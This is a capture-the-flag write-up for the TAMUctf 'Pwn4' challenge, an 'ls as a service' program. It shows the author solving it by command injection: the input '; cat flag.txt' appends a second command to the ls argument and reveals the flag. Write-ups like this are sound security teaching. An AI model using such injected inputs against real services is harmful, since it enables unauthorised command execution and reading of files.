# Pwn4
Pwn

## Challenge 

nc pwn.tamuctf.com 4324

Difficulty: medium

## Solution

Program is simple enough 

	# ./pwn4
	ls as a service (laas)(Copyright pending)
	Enter the arguments you would like to pass to ls:
	HELLO
	Result of ls HELLO:
	ls: cannot access 'HELLO': No such file or directory

Try on server 

	# nc pwn.tamuctf.com 4324
	ls as a service (laas)(Copyright pending)
	Enter the arguments you would like to pass to ls:
	.
	Result of ls .:
	flag.txt
	pwn4


	ls as a service (laas)(Copyright pending)
	Enter the arguments you would like to pass to ls:
	flag.txt
	Result of ls flag.txt:
	flag.txt


	ls as a service (laas)(Copyright pending)
	Enter the arguments you would like to pass to ls:
	; cat flag.txt
	Result of ls ; cat flag.txt:
	flag.txt
	pwn4
	gigem{5y573m_0v3rfl0w}

Flag text indicates that this is the unintended solution.

## Flag

	gigem{5y573m_0v3rfl0w}
